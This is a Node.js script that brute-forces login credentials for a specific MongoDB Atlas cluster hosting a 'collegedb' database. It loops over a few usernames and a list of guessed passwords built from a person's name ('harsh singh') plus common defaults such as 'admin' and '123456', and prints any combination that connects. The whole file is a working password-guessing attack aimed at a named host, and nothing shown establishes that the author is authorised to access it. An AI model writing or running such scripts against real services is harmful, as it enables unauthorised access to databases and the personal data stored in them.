const dns = require("dns");
dns.setServers(["8.8.8.8", "1.1.1.1"]);

const mongoose = require("mongoose");

const testURI = (uri, user, pass) => {
  return mongoose.connect(uri, { serverSelectionTimeoutMS: 5000 })
    .then(() => {
      console.log(`\n\n=== SUCCESS ===\nUser: ${user}\nPass: ${pass}\nURI: ${uri}\n===============\n`);
      mongoose.connection.close();
      return true;
    })
    .catch(err => {
      process.stdout.write("."); // Print dot to show progress
      return false;
    });
};

const main = async () => {
  const users = ["harsh_singh", "harshsingh", "admin", "root"];
  const passwords = [
    "harshsingh",
    "harsh_singh",
    "harsh",
    "harsh123",
    "harshsingh123",
    "harsh_singh123",
    "harshsingh@123",
    "harsh_singh@123",
    "harsh@123",
    "singh",
    "singh123",
    "collegedb",
    "admin",
    "password",
    "root",
    "123456",
    "12345678"
  ];

  console.log("Testing combinations...");

  for (const user of users) {
    for (const pass of passwords) {
      // URL encode user and pass
      const encUser = encodeURIComponent(user);
      const encPass = encodeURIComponent(pass);
      const uri = `mongodb+srv://${encUser}:${encPass}@cluster0.et4sswu.mongodb.net/collegedb?retryWrites=true&w=majority&appName=Cluster0`;
      
      const success = await testURI(uri, user, pass);
      if (success) {
        process.exit(0);
      }
    }
  }
  console.log("\nAll combinations failed.");
  process.exit(1);
};

main();
